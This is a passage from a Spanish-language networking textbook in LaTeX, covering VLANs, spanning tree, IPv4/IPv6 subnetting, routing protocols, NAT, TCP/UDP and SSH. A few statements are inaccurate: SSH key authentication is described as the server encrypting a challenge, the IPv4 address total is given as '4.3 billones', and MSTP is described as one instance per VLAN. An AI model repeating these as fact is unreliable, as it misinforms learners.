          manda la trama a todos los puertos excepto el 1
    \item PC-B (MAC \texttt{BB:BB}) en puerto 3 responde
    \item Switch aprende: ``\texttt{BB:BB} → puerto 3''
    \item Comunicaciones futuras: \textbf{forwarding} directo al puerto correcto
\end{enumerate}
\end{ejemplo}

\section{\eh{card-index-dividers} VLANs --- Virtual LANs (IEEE 802.1Q)}

\begin{concepto}
Una \textbf{VLAN} divide lógicamente un switch físico en múltiples switches
virtuales independientes. El tráfico de VLAN 10 es invisible para VLAN 20
y no puede comunicarse con ella sin pasar por un router (capa 3).

\emoji{light-bulb} \textbf{Analogía:} Un edificio con varios departamentos.
Todos comparten el mismo edificio físico (el switch), pero cada departamento
tiene su propia llave y no puede entrar a los otros sin pasar por la
recepción del edificio (el router).

\textbf{Beneficios:} segmentación de seguridad, reducción de broadcast domains,
organización lógica independiente de la ubicación física.
\end{concepto}

El estándar \textbf{IEEE 802.1Q} agrega un tag de \textbf{4 bytes} a la trama
Ethernet entre el campo Source MAC y el EtherType:

\begin{verbatim}
 Trama 802.1Q:
 ┌──────────┬─────────┬────────┬─────┬──────────────┬────────┬─────────┐
 │ Dst MAC  │ Src MAC │ 0x8100 │ PCP │   VLAN ID    │  Type  │ Payload │
 │  6 bytes │ 6 bytes │ 2 bytes│ 3 b │   12 bits    │ 2 bytes│  ...    │
 └──────────┴─────────┴────────┴─────┴──────────────┴────────┴─────────┘
             └──────────────── 802.1Q Tag (4 bytes) ────────┘

 VLAN ID (VID): valores 1–4094
   0    → reservado (sin VLAN)
   1    → VLAN default (no usar para datos)
   4095 → reservado
\end{verbatim}

Tipos de puertos en un switch:
\begin{itemize}
    \item \textbf{Access port:} conecta a un dispositivo final (PC, impresora).
          Solo pertenece a \textit{una} VLAN. Las tramas entran/salen sin tag.
    \item \textbf{Trunk port:} conecta switches entre sí o a un router.
          Transporta tráfico de \textit{múltiples} VLANs con tags 802.1Q.
\end{itemize}

\section{\eh{arrows-counterclockwise} STP / RSTP --- Spanning Tree}

\begin{concepto}
\textbf{STP} (Spanning Tree Protocol, IEEE 802.1D) previene \textbf{loops}
en redes con múltiples switches. Un loop de capa 2 es catastrófico:
los broadcasts se replican infinitamente consumiendo 100\% del ancho de banda
(broadcast storm) hasta colapsar la red.

\emoji{light-bulb} \textbf{Analogía:} Imagina un rumor en la escuela: Juan se
lo cuenta a María, María a Pedro, Pedro a Juan... y el rumor circula para
siempre. STP ``corta'' conexiones redundantes para que no haya loops,
pero las mantiene como respaldo.
\end{concepto}

Proceso STP simplificado:
\begin{enumerate}
    \item \textbf{Elección del Root Bridge:} el switch con menor Bridge ID
          (prioridad + MAC) se convierte en raíz. Por defecto, prioridad = 32768.
    \item \textbf{Root Ports:} cada switch no-raíz elige su mejor camino al Root Bridge.
    \item \textbf{Designated Ports:} en cada segmento, el puerto con mejor camino al Root.
    \item \textbf{Blocking:} los puertos restantes se bloquean (no reenvían datos,
          pero sí escuchan BPDUs para detectar cambios).
\end{enumerate}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Versión} & \textbf{Convergencia} & \textbf{Nota} \\
\midrule
STP (802.1D)  & 30--50 segundos & Original, lento \\
RSTP (802.1w) & 1--2 segundos  & Rapid STP, estándar actual \\
MSTP (802.1s) & 1--2 segundos  & Multiple STP, una instancia por VLAN \\
\bottomrule
\end{tabular}
\caption{Versiones de Spanning Tree}
\end{table}

\section{\eh{chains} EtherChannel / LACP}

\begin{concepto}
\textbf{EtherChannel} agrupa múltiples enlaces físicos en uno lógico,
multiplicando el ancho de banda y agregando redundancia.

\textbf{LACP} (Link Aggregation Control Protocol, IEEE 802.3ad) es el protocolo
estándar para negociar EtherChannel dinámicamente.
\end{concepto}

\begin{ejemplo}
4 cables Ethernet de 1 Gbps entre dos switches → se ven como
\textbf{un único enlace de 4 Gbps}. Si un cable falla físicamente,
el canal sigue funcionando con 3 Gbps. STP no bloquea ninguno porque
el EtherChannel es un solo enlace lógico.
\end{ejemplo}

\section{\eh{shield} Port Security}

\begin{concepto}
\textbf{Port Security} restringe qué direcciones MAC pueden conectarse a un
puerto del switch. Protege contra MAC flooding y dispositivos no autorizados.
\end{concepto}

Modos de violación:
\begin{itemize}
    \item \textbf{Protect:} descarta tramas de MACs no autorizadas, sin alerta
    \item \textbf{Restrict:} descarta y envía un SNMP trap / log
    \item \textbf{Shutdown:} pone el puerto en \textit{err-disabled state} (requiere intervención manual)
\end{itemize}

\begin{codigo}
\begin{lstlisting}
! Cisco IOS - configurar port security en Fa0/1
interface FastEthernet0/1
 switchport mode access
 switchport access vlan 10
 switchport port-security maximum 2
 switchport port-security mac-address sticky
 switchport port-security violation shutdown
\end{lstlisting}
\end{codigo}

\chapter{\eh{world-map} Capa 3 --- Red (Network Layer)}

\section{\eh{thinking-face} ¿Qué hace la capa de red?}

\begin{concepto}
La capa de red \textbf{enruta paquetes} de una red a otra hasta llegar al
destino final, aunque el camino pase por decenas de routers.
Usa \textbf{direcciones IP} para identificar origen y destino a nivel global.

\emoji{light-bulb} \textbf{Analogía:} Las MACs son el número de asiento en tu
salón (LAN local). Las IPs son como tu dirección postal completa (funcionan
en cualquier parte del mundo). Un router es el servicio de mensajería
que sabe cómo llevar tu paquete de ciudad en ciudad hasta la dirección correcta.
\end{concepto}

\section{\eh{puzzle-piece} IPv4}

\subsection{Header IPv4 (20 bytes mínimo)}

\begin{lstlisting}
 0         1         2         3
 01234567890123456789012345678901
 ┌───────┬────┬────────────┬─────────────────────────┐
 │Ver=4  │IHL │    DSCP    │ECN│   Total Length       │
 │ 4 bits│4 b │  6 bits    │2b │     16 bits          │
 ├───────────────────────────┬───┬────────────────────┤
 │     Identification        │Flg│  Fragment Offset    │
 │        16 bits            │3b │     13 bits         │
 ├────────────┬──────────────┴───┴────────────────────┤
 │ TTL (8b)  │ Protocol (8b) │   Header Checksum      │
 ├────────────┴──────────────┴────────────────────────┤
 │               Source IP Address (32 bits)          │
 ├────────────────────────────────────────────────────┤
 │             Destination IP Address (32 bits)        │
 └────────────────────────────────────────────────────┘
\end{lstlisting}

Campos clave:
\begin{itemize}
    \item \textbf{TTL} (Time to Live): cada router decrementa en 1. Al llegar
          a 0, el paquete se descarta y se envía ICMP ``Time Exceeded'' al origen.
          Evita loops infinitos. Valor inicial típico: 64 (Linux) o 128 (Windows).
    \item \textbf{Protocol:} qué viene en el payload.
          1 = ICMP, 6 = TCP, 17 = UDP, 89 = OSPF.
    \item \textbf{Flags:} DF (Don't Fragment), MF (More Fragments).
    \item \textbf{Total Length:} tamaño total del paquete IP incluyendo header y datos.
\end{itemize}

\subsection{Clases de IP (histórico) y CIDR}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lllll}
\toprule
\textbf{Clase} & \textbf{Rango primer octeto} & \textbf{Máscara default} & \textbf{Hosts por red} & \textbf{Para} \\
\midrule
A & 1 -- 126      & /8  (255.0.0.0)     & 16,777,214 & Grandes ISPs \\
B & 128 -- 191    & /16 (255.255.0.0)   & 65,534     & Universidades \\
C & 192 -- 223    & /24 (255.255.255.0) & 254        & Empresas pequeñas \\
D & 224 -- 239    & --- (multicast)     & ---        & Streaming, routing \\
E & 240 -- 255    & --- (experimental)  & ---        & Reservado \\
\bottomrule
\end{tabular}
\caption{Clases de IPv4 (sistema clásico, reemplazado por CIDR)}
\end{table}

\begin{concepto}
\textbf{CIDR} (Classless Inter-Domain Routing, RFC 1519, 1993) reemplazó el
sistema de clases. Permite máscaras de cualquier longitud (/1 -- /32),
lo que hace un uso mucho más eficiente del espacio de IPs.

Ejemplo: \texttt{192.168.1.0/26} significa que los primeros 26 bits son la red
y los últimos 6 bits son para hosts → $2^6 - 2 = 62$ hosts por subred.
\end{concepto}

\subsection{Subnetting paso a paso}

\begin{ejemplo}
\textbf{Problema:} Dividir \texttt{192.168.10.0/24} en \textbf{4 subredes iguales}.

\textbf{Paso 1:} Necesitamos $2^n \geq 4$ subredes → $n = 2$ bits prestados.

\textbf{Paso 2:} Nueva máscara: /24 + 2 = \textbf{/26}
\[ 255.255.255.\underbrace{11}_{\text{red}}000000_2 = 255.255.255.192 \]

\textbf{Paso 3:} Tamaño de cada subred: $2^{32-26} = 2^6 = 64$ IPs por bloque.

\textbf{Paso 4:} Las 4 subredes:
\begin{itemize}
    \item \texttt{192.168.10.0/26}   → hosts \texttt{.1} a \texttt{.62}   (broadcast: \texttt{.63})
    \item \texttt{192.168.10.64/26}  → hosts \texttt{.65} a \texttt{.126}  (broadcast: \texttt{.127})
    \item \texttt{192.168.10.128/26} → hosts \texttt{.129} a \texttt{.190} (broadcast: \texttt{.191})
    \item \texttt{192.168.10.192/26} → hosts \texttt{.193} a \texttt{.254} (broadcast: \texttt{.255})
\end{itemize}

\textbf{Fórmulas:}
$\text{subredes} = 2^n$ \quad $\text{hosts/subred} = 2^h - 2$ \quad donde $n+h = 32 - \text{prefijo original}$
\end{ejemplo}

\subsection{IPs especiales (RFC 1918 y otros)}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Rango} & \textbf{Tipo} & \textbf{Uso} \\
\midrule
10.0.0.0/8           & Privada clase A  & Redes corporativas grandes \\
172.16.0.0/12        & Privada clase B  & Redes medianas \\
192.168.0.0/16       & Privada clase C  & Redes domésticas / pequeñas \\
127.0.0.0/8          & Loopback         & 127.0.0.1 = ``yo mismo'' \\
169.254.0.0/16       & APIPA link-local & Asignada automáticamente sin DHCP \\
100.64.0.0/10        & Shared Address   & NAT de operador (carrier-grade NAT) \\
0.0.0.0/0            & Default route    & ``todo el resto'' en tablas de ruteo \\
192.0.2.0/24         & Documentación    & Ejemplos en RFCs (RFC 5737) \\
\bottomrule
\end{tabular}
\caption{Rangos de IP especiales}
\end{table}

\section{\eh{right-arrow-curving-up} Routing --- Enrutamiento}

\begin{concepto}
Un \textbf{router} selecciona el mejor camino hacia el destino basándose
en su \textbf{tabla de ruteo}. Cada entrada en la tabla dice:
``para llegar a la red X, envía por la interfaz Y hacia el next-hop Z''.
La ruta más específica (mayor prefijo) siempre gana --- esto se llama
\textbf{Longest Prefix Match}.
\end{concepto}

\subsection{Routing estático}

\begin{codigo}
\begin{lstlisting}
! Cisco IOS - ruta estática
ip route 10.0.2.0 255.255.255.0 192.168.1.1
!            red destino   máscara      next-hop

! Ruta default (gateway de último recurso)
ip route 0.0.0.0 0.0.0.0 203.0.113.1

! Ver tabla de ruteo
show ip route
\end{lstlisting}
\end{codigo}

\subsection{OSPF --- Open Shortest Path First (RFC 2328)}

\begin{concepto}
\textbf{OSPF} es un protocolo de routing dinámico de \textbf{link-state}.
Cada router aprende la topología completa de la red y calcula el camino
más corto usando el \textbf{algoritmo de Dijkstra (SPF)}.

\emoji{light-bulb} \textbf{Analogía:} Cada router tiene un mapa completo de
la ciudad. Cuando necesita enviar un paquete, calcula la ruta más corta
por su cuenta usando el mapa. Si una calle se corta, actualiza su mapa
y recalcula. RIP en cambio es como preguntar a cada vecino cuántos pasos
hay a cada destino --- más simple pero menos preciso y lento en converger.
\end{concepto}

Conceptos clave de OSPF:
\begin{itemize}
    \item \textbf{Áreas:} la red se divide en áreas para reducir el tamaño de la LSDB.
          El \textbf{Área 0} (backbone) es obligatoria; todas las demás áreas
          deben conectarse a ella.
    \item \textbf{LSA} (Link State Advertisement): mensajes que intercambian los routers
          para describir sus enlaces y vecinos.
    \item \textbf{LSDB} (Link State Database): la base de datos de toda la topología.
          Todos los routers en el mismo área tienen la misma LSDB.
    \item \textbf{DR/BDR} (Designated Router / Backup DR): en redes multi-acceso
          (Ethernet), un solo router centraliza los LSAs para reducir tráfico.
    \item \textbf{Costo OSPF}: $\text{costo} = \frac{10^8}{\text{bandwidth en bps}}$.
          Ethernet 100 Mbps → costo 1. Serial 1.5 Mbps → costo 64.
\end{itemize}

\subsection{BGP --- Border Gateway Protocol (RFC 4271)}

\begin{concepto}
\textbf{BGP} es el protocolo de routing de Internet. Conecta
\textbf{Sistemas Autónomos (AS)} --- grandes redes de ISPs y corporaciones.
Es el único protocolo de routing que funciona a escala de todo Internet:
$>$900,000 prefijos IPv4 en la tabla BGP global.

\emoji{light-bulb} \textbf{Analogía:} Si OSPF es el GPS dentro de tu ciudad
(todos comparten el mismo mapa), BGP es el sistema de tratados entre países:
cada país (AS) decide sus propias políticas de tránsito y las anuncia
a sus vecinos mediante acuerdos (sessions BGP).
\end{concepto}

\begin{itemize}
    \item \textbf{eBGP:} entre routers de diferente AS (External BGP)
    \item \textbf{iBGP:} entre routers del mismo AS (Internal BGP)
    \item \textbf{AS number:} identificador del sistema autónomo (ej: AS13335 = Cloudflare)
\end{itemize}

\begin{cuidado}
\textbf{BGP Hijacking:} un AS puede anunciar prefijos IP que no le pertenecen,
robando o espiando tráfico. Caso famoso: Pakistan Telecom (2008) dejó YouTube
inaccesible \textit{en todo el mundo} durante 2 horas por un error de configuración BGP.

Defensa moderna: \textbf{RPKI} (Resource Public Key Infrastructure) ---
los dueños legítimos firman criptográficamente sus prefijos. Routers con
RPKI rechazan anuncios no firmados. Ver capítulo de seguridad.
\end{cuidado}

\subsection{HSRP --- Hot Standby Router Protocol}

\begin{concepto}
\textbf{HSRP} (RFC 2281, propietario Cisco) proporciona \textbf{gateway redundante}:
varios routers comparten una IP virtual. Si el router activo falla,
el standby toma la IP virtual en segundos. Los hosts solo ven la IP virtual.

Estándar abierto equivalente: \textbf{VRRP} (RFC 5798).
\end{concepto}

\section{\eh{recycle} NAT --- Network Address Translation}

\begin{concepto}
\textbf{NAT} permite que múltiples dispositivos con IPs privadas compartan
una sola IP pública. Es la razón por la que todos los dispositivos de tu
casa tienen IPs \texttt{192.168.x.x} pero salen a Internet con una sola IP.

\emoji{light-bulb} \textbf{Analogía:} El router es la recepción de una gran
empresa. Todas las llamadas internas salen con el número de la empresa, y la
recepcionista (NAT table) sabe a qué extensión interna redirigir cada respuesta.
\end{concepto}

\textbf{PAT} (Port Address Translation) = NAT overload: usa números de puerto
para distinguir entre múltiples conexiones internas que comparten la misma IP pública:

\begin{lstlisting}
  Interno                    Router NAT               Internet
  192.168.1.10:54321  →  203.0.113.1:10001  →   servidor:443
  192.168.1.11:52010  →  203.0.113.1:10002  →   servidor:80
  192.168.1.10:55000  →  203.0.113.1:10003  →   otro-server:443

  NAT Table:
  Entrada interna       ↔  Entrada pública
  192.168.1.10:54321   ↔  203.0.113.1:10001
  192.168.1.11:52010   ↔  203.0.113.1:10002
\end{lstlisting}

\section{\eh{globe-with-meridians} IPv6 (RFC 8200, 2017)}

\begin{concepto}
IPv4 tiene $\approx 4.3$ billones de direcciones y ya se agotaron (2011).
\textbf{IPv6} tiene 128 bits → $3.4 \times 10^{38}$ direcciones.
Suficientes para dar \textbf{670 cuatrillones de IPs por milímetro cuadrado}
de la superficie terrestre.
\end{concepto}

Formato: \texttt{2001:0db8:85a3:0000:0000:8a2e:0370:7334}

Reglas de abreviación:
\begin{itemize}
    \item Ceros iniciales en cada grupo se omiten: \texttt{0001} → \texttt{1}
    \item Grupos consecutivos de \texttt{0000} se reemplazan una vez por \texttt{::}
    \item \texttt{2001:0db8:0000:0000:0000:0000:0000:0001} → \texttt{2001:db8::1}
\end{itemize}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Tipo} & \textbf{Prefijo} & \textbf{Equivalente IPv4} \\
\midrule
Loopback        & \texttt{::1/128}     & 127.0.0.1 \\
Link-local      & \texttt{fe80::/10}   & 169.254.0.0/16 \\
Global unicast  & \texttt{2000::/3}    & IP pública \\
Unique local    & \texttt{fc00::/7}    & RFC 1918 (privadas) \\
Multicast       & \texttt{ff00::/8}    & 224.0.0.0/4 \\
\bottomrule
\end{tabular}
\caption{Tipos de direcciones IPv6}
\end{table}

\begin{cuidado}
IPv6 \textbf{no tiene broadcast}. Usa \textbf{multicast} para las funciones
que en IPv4 usaban broadcast. Por ejemplo:
\begin{itemize}
    \item ARP es reemplazado por \textbf{NDP} (Neighbor Discovery Protocol)
          usando mensajes multicast \texttt{ff02::1} (todos los nodos).
    \item Los routers escuchan en \texttt{ff02::2} (todos los routers).
\end{itemize}
\end{cuidado}

\subsection{ICMP --- Internet Control Message Protocol}

\begin{concepto}
\textbf{ICMP} (RFC 792) es el protocolo de mensajes de control de IP.
No transporta datos de usuario, sino mensajes de diagnóstico y error.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Tipo} & \textbf{Código} & \textbf{Mensaje} \\
\midrule
8  & 0 & Echo Request (ping enviado) \\
0  & 0 & Echo Reply (respuesta a ping) \\
11 & 0 & Time Exceeded (TTL=0, usado por traceroute) \\
3  & 0 & Destination Unreachable - Network unreachable \\
3  & 1 & Destination Unreachable - Host unreachable \\
3  & 3 & Destination Unreachable - Port unreachable \\
\bottomrule
\end{tabular}
\caption{Mensajes ICMP comunes}
\end{table}

\begin{ejemplo}
\textbf{¿Cómo funciona traceroute?}

Traceroute envía paquetes UDP (o ICMP en Windows) con TTL=1, 2, 3...
\begin{itemize}
    \item TTL=1: el primer router lo decrementa a 0 y responde con ICMP
          ``Time Exceeded'' → revela la IP del primer salto.
    \item TTL=2: el segundo router responde → IP del segundo salto.
    \item Y así sucesivamente hasta llegar al destino, que responde con
          ICMP ``Port Unreachable'' (o Echo Reply en ICMP mode).
\end{itemize}
\end{ejemplo}

\chapter{\eh{truck} Capa 4 --- Transporte (Transport Layer)}

\section{\eh{thinking-face} ¿Qué hace la capa de transporte?}

\begin{concepto}
La capa de transporte entrega datos de \textbf{proceso a proceso}
(aplicación a aplicación) usando \textbf{números de puerto}.
Vive en los hosts extremos --- los routers intermedios no la procesan.

\emoji{light-bulb} \textbf{Analogía:} IP sabe llegar a la \textit{casa} correcta (host).
El puerto es el \textit{número de departamento} en esa casa. El cartero (IP)
deja el paquete en la puerta del edificio; el portero (transporte) lo sube
al departamento correcto (la aplicación).
\end{concepto}

\subsection{Números de puerto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{llll}
\toprule
\textbf{Rango} & \textbf{Tipo} & \textbf{Ejemplos} & \textbf{Quién los asigna} \\
\midrule
0 -- 1023    & Well-known    & 80=HTTP, 443=HTTPS, 22=SSH, 53=DNS & IANA \\
1024 -- 49151 & Registered   & 3306=MySQL, 5432=PostgreSQL, 6379=Redis & IANA \\
49152 -- 65535 & Ephemeral   & Origen temporal del cliente & OS \\
\bottomrule
\end{tabular}
\caption{Rangos de números de puerto}
\end{table}

Una \textbf{socket} = IP + puerto. Identifica únicamente un proceso en la red:
\texttt{192.168.1.10:54321} ↔ \texttt{142.250.80.46:443}

\section{\eh{zap} UDP --- User Datagram Protocol (RFC 768)}

\begin{concepto}
\textbf{UDP} es \textbf{connectionless} (sin conexión previa): envía datagramas
sin establecer conexión, sin confirmar que llegaron, sin controlar el orden.

\emoji{light-bulb} \textbf{Analogía:} UDP es como mandar postales.
Las mandas y asumes que llegan. Si se pierde una... ni modo.
Pero es \textit{mucho más rápido} que mandar carta certificada.
\end{concepto}

Header UDP --- solo \textbf{8 bytes}:

\begin{lstlisting}
  0              15 16             31
  ┌───────────────┬─────────────────┐
  │  Source Port  │ Destination Port│
  │   (16 bits)   │   (16 bits)     │
  ├───────────────┼─────────────────┤
  │    Length     │    Checksum     │
  │   (16 bits)   │   (16 bits)     │
  └───────────────┴─────────────────┘
\end{lstlisting}

Casos de uso de UDP: DNS, DHCP, TFTP, streaming de video (YouTube usa QUIC/UDP),
VoIP, gaming online, NTP. \textbf{Velocidad $>$ confiabilidad.}

\section{\eh{handshake} TCP --- Transmission Control Protocol (RFC 793)}

\begin{concepto}
\textbf{TCP} es \textbf{connection-oriented} (orientado a conexión):
establece una conexión antes de enviar datos, garantiza \textbf{entrega en orden},
retransmite paquetes perdidos y controla el flujo para no saturar al receptor.

\emoji{light-bulb} \textbf{Analogía:} TCP es como una llamada telefónica.
Primero marcas (SYN), esperas que respondan (SYN-ACK), confirmas
``¡Hola, te escucho!'' (ACK), y \textit{después} empiezas a hablar.
Además, si no escuchaste una parte, dices ``¿puedes repetir?'' y la otra
persona lo repite (retransmisión).
\end{concepto}

\subsection{Header TCP --- 20 bytes mínimo}

\begin{lstlisting}
  0         1         2         3
  ┌──────────────────┬──────────────────┐
  │   Source Port    │  Dest. Port      │  (32 bits)
  ├──────────────────┴──────────────────┤
  │           Sequence Number           │  (32 bits)
  ├─────────────────────────────────────┤
  │         Acknowledgment Number       │  (32 bits)
  ├────┬────┬─────────────┬─────────────┤
  │Off │Rsv │   Flags     │   Window    │  (32 bits)
  │4b  │4b  │U A P R S F  │  (16 bits)  │
  ├────┴────┴─────────────┴─────────────┤
  │    Checksum         │  Urgent Ptr   │  (32 bits)
  └─────────────────────────────────────┘
\end{lstlisting}

\subsection{Flags TCP}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{clll}
\toprule
\textbf{Bit} & \textbf{Flag} & \textbf{Nombre} & \textbf{Uso} \\
\midrule
1 & URG & Urgent    & Datos urgentes, procesarlos antes \\
2 & ACK & Acknowledge & Confirma recepción (Ack Number es válido) \\
3 & PSH & Push      & Enviar al app inmediatamente, sin buffering \\
4 & RST & Reset     & Cierre abrupto de la conexión / error \\
5 & SYN & Synchronize & Iniciar conexión (intercambiar Seq Numbers) \\
6 & FIN & Finish    & Cierre normal de la conexión \\
\bottomrule
\end{tabular}
\caption{Flags TCP}
\end{table}

\subsection{TCP 3-Way Handshake}

\begin{center}
\begin{tikzpicture}[
    msg/.style={-{Stealth}, thick},
    nota/.style={font=\small\ttfamily, text=gray!70!white}
]
\node[font=\bfseries, text=textlight] (client) at (0,  0) {Cliente};
\node[font=\bfseries, text=textlight] (server) at (8,  0) {Servidor};
\draw[thick, draw=gray!50!white] (0,-0.3) -- (0,-5.5);
\draw[thick, draw=gray!50!white] (8,-0.3) -- (8,-5.5);

% SYN
\draw[msg, cyan!70!white] (0,-1.0) -- (8,-1.8)
    node[midway, above, sloped, font=\small, text=cyan!80!white] {\textbf{SYN} seq=1000};
\node[nota, left] at (0,-1.0) {CLOSED};
\node[nota, right] at (8,-1.8) {SYN\_RCVD};

% SYN-ACK
\draw[msg, orange!80!white] (8,-1.8) -- (0,-2.8)
    node[midway, above, sloped, font=\small, text=orange!80!white] {\textbf{SYN+ACK} seq=5000, ack=1001};
\node[nota, left] at (0,-2.8) {SYN\_SENT};

% ACK
\draw[msg, green!60!white] (0,-2.8) -- (8,-3.6)
    node[midway, above, sloped, font=\small] {\textbf{ACK} ack=5001};
\node[nota, right] at (8,-3.6) {ESTABLISHED};
\node[nota, left] at (0,-3.6) {ESTABLISHED};

\node[font=\small\itshape, text=green!60!white] at (4,-4.4)
    {Conexión establecida \emoji{check-mark-button} --- datos pueden fluir};
\end{tikzpicture}
\end{center}

\begin{cuidado}
\textbf{SYN Flood Attack:} un atacante envía miles de SYNs sin completar
el handshake (nunca manda el ACK final). El servidor guarda estado en
memoria por cada SYN → agota recursos (DoS).

Defensa: \textbf{SYN cookies} (el servidor no guarda estado hasta recibir
el ACK), límite de tasa de SYNs, firewalls.
\end{cuidado}

\subsection{TCP 4-Way Termination}

\begin{lstlisting}
  Cliente              Servidor
     │─── FIN ──────────►│   "Terminé de enviar datos"
     │◄── ACK ───────────│   "Recibido, espera"
     │                   │   (servidor puede seguir enviando)
     │◄── FIN ───────────│   "Yo también terminé"
     │─── ACK ──────────►│   "Ok, cerramos"
     │                   │
    [TIME_WAIT: 2×MSL ≈ 4 min]
\end{lstlisting}

\textbf{TIME\_WAIT:} el cliente espera para asegurarse de que el último ACK
llegó. Si el servidor no lo recibió, retransmitirá el FIN y el cliente podrá
responder. Esto previene que segmentos ``fantasmas'' de la conexión anterior
contaminen una nueva.

\subsection{Control de flujo y congestión}

\begin{concepto}
\textbf{Control de flujo:} el receptor anuncia su \textbf{receive window (rwnd)}
en cada ACK: ``puedo recibir hasta X bytes más sin esperar''. El emisor
no envía más de lo que el receptor puede procesar.

\textbf{Control de congestión:} TCP ajusta la velocidad según el estado
de la red, controlado por la \textbf{congestion window (cwnd)}.
\end{concepto}

Fases del control de congestión TCP (algoritmo CUBIC, default en Linux):

\begin{enumerate}
    \item \textbf{Slow Start:} cwnd comienza en 1 MSS y se \textit{dobla}
          con cada RTT. Crecimiento exponencial hasta llegar a \textit{ssthresh}.
    \item \textbf{Congestion Avoidance:} al superar ssthresh, crece en
          1 MSS por RTT (lineal). Más conservador.
    \item \textbf{Fast Retransmit:} si llegan \textbf{3 ACKs duplicados},
          el emisor retransmite inmediatamente sin esperar timeout.
    \item \textbf{Fast Recovery:} tras la pérdida detectada por 3-dup-ACK,
          ssthresh = cwnd/2 y cwnd = ssthresh (no regresa a 1). Rápida recuperación.
    \item \textbf{Timeout:} si no llega ACK en el timeout, cwnd regresa a 1.
          Mucho más severo que fast recovery.
\end{enumerate}

\begin{cuidado}
\textbf{¿Por qué TCP tiene problemas con HTTP?}

Cada nueva conexión TCP debe hacer handshake (1 RTT) + slow start desde cero.
HTTP/1.1 abría múltiples conexiones TCP en paralelo (hasta 6 por dominio)
para simular paralelismo, pero esto saturaba la red.

HTTP/2 resolvió esto con \textit{multiplexing} sobre una sola conexión TCP.
Pero TCP en sí tiene un problema: si un paquete se pierde, todos los streams
esperan (Head-of-Line Blocking a nivel TCP). QUIC (ver capítulo 8)
resuelve esto usando UDP con streams independientes.
\end{cuidado}

\chapter{\eh{handshake} Capa 5 --- Sesión (Session Layer)}

\begin{concepto}
La capa de sesión establece, gestiona y termina \textbf{sesiones} de
comunicación entre aplicaciones. Se encarga de sincronizar el diálogo,
controlar quién habla cuándo, y manejar puntos de control (checkpoints)
para reanudar sesiones interrumpidas.

\emoji{warning} \textbf{Nota sobre clasificación:} SSH, NetBIOS y otros protocolos
que ``viven'' en capa 5 son a veces clasificados en capa 7 por otras fuentes.
En la práctica real, los protocolos no siguen OSI perfectamente. Lo importante
es entender qué hace cada protocolo, no en qué caja exacta meterlo.
\end{concepto}

\section{\eh{locked-with-key} SSH --- Secure Shell (RFC 4251--4254)}

\begin{concepto}
\textbf{SSH} proporciona acceso remoto seguro a sistemas. Todo el tráfico
está \textbf{cifrado}: contraseñas, comandos, y respuestas. Reemplazó
completamente a Telnet y rlogin.

\emoji{light-bulb} \textbf{Analogía:} Telnet es como hablar en voz alta
en un café lleno de gente --- cualquiera escucha tu contraseña.
SSH es como estar en una cabina de sonido insonorizada y con candado:
solo tú y el servidor saben qué se dijo.
\end{concepto}

\subsection{SSH vs Telnet}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Característica} & \textbf{Telnet} & \textbf{SSH} \\
\midrule
Puerto          & 23              & 22 \\
Cifrado         & \emoji{cross-mark} Ninguno & \emoji{check-mark-button} Sí (AES, ChaCha20) \\
Autenticación   & Contraseña en texto claro & Clave pública o contraseña cifrada \\
Integridad      & \emoji{cross-mark} No    & \emoji{check-mark-button} HMAC \\
Seguridad       & \emoji{skull} Inseguro   & \emoji{shield} Seguro \\
Estado actual   & Obsoleto, no usar         & Estándar de la industria \\
\bottomrule
\end{tabular}
\caption{Comparativa SSH vs Telnet}
\end{table}

\subsection{Arquitectura SSH (3 protocolos en uno)}

SSH se compone de 3 sub-protocolos apilados:
\begin{enumerate}
    \item \textbf{SSH Transport Layer (RFC 4253):} establece la conexión TCP,
          negocia algoritmos y realiza el key exchange (Diffie-Hellman).
    \item \textbf{SSH Authentication Protocol (RFC 4252):} autentica al usuario
          con contraseña o clave pública.
    \item \textbf{SSH Connection Protocol (RFC 4254):} multiplexa múltiples
          canales sobre la conexión segura (sesión de terminal, port forwarding, SFTP).
\end{enumerate}

\subsection{Proceso de conexión SSH}

\begin{lstlisting}
  Cliente                         Servidor
     │──── TCP SYN ──────────────►│
     │◄─── TCP SYN-ACK ───────────│
     │──── TCP ACK ──────────────►│
     │                            │
     │◄─── SSH-2.0-OpenSSH_x.x ──│  (identificación de versión)
     │──── SSH-2.0-OpenSSH_x.x ──►│
     │                            │
     │◄─── Server Key Exchange ───│  (algoritmos + Diffie-Hellman params)
     │──── Client Key Exchange ──►│  (valor DH público del cliente)
     │                            │  (ambos calculan el shared secret)
     │◄─── New Keys ──────────────│  (todo lo siguiente va cifrado)
     │──── New Keys ─────────────►│
     │                            │
     │──── [ENC] auth request ───►│  (usuario + método de auth)
     │◄─── [ENC] auth success ────│
     │                            │
     │──── [ENC] channel open ───►│  (abrir sesión de terminal)
     │◄─── [ENC] channel conf ────│
     │═══════ Sesión cifrada ══════│
\end{lstlisting}

\subsection{Autenticación por clave pública}

\begin{concepto}
Más segura que contraseña porque la clave privada \textit{nunca} sale de
tu máquina. Basada en criptografía asimétrica: lo que una clave cifra,
solo la otra puede descifrar.
\end{concepto}

\begin{enumerate}
    \item Generas un par de claves: \texttt{ssh-keygen -t ed25519 -C "tu@email.com"}
    \item Clave pública (\texttt{\textasciitilde/.ssh/id\_ed25519.pub}) → va al servidor
          en \texttt{\textasciitilde/.ssh/authorized\_keys}
    \item Al conectar: el servidor cifra un desafío aleatorio con tu clave pública
    \item Tu cliente lo descifra con la clave privada y responde
    \item Sin contraseña que viajar por la red → sin riesgo de captura
\end{enumerate}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Algoritmo} & \textbf{Bits} & \textbf{Nota} \\
\midrule
RSA       & 2048--4096  & Antiguo, funciona bien pero lento \\
